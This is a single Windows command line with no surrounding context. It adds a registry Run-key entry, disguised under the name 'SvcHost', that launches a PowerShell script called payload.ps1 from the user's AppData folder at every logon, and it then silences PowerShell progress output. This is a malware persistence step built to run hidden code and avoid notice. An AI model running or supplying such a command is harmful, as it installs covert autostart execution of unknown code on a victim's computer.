reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SvcHost" /t REG_SZ /d "powershell.exe -NoP -File $env:APPDATA\payload.ps1" /f; $ProgressPreference = "SilentlyContinue"
